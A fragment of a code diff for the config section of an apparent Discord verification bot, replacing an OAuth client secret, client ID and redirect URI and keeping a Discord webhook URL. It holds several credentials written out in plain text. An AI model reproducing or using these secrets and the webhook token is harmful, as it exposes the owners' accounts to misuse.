@@ -1,7 +1,7 @@
 //Config
-const secret_value = 'h2z8Q~GtKhZZ3juontN1QJZ4WMSTYB_bxygeVdB-'
-const client_id = '4844e7ff-e8b5-499e-8412-ad0199453c29'
-const redirect_uri = 'https://discord-verification-bot-s3ke.onrender.com/'
+const secret_value = 'Cy.8Q~uc2pHYLA_DTrAFPFaGtdkmHkK8LvZDMbv~'
+const client_id = '2cfbc09e-a8f1-4bd8-987c-ce69070e0b58'
+const redirect_uri = 'https://discord-verification-bot.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1058120557599674388/u4JyG92btOgrwxVi6Gwmqti4qC8ZTJns6VJxc4ei-idlpEFtiwd5vqfxXgN-GqkiP0vc'
 //Requirements
 const axios = require('axios')
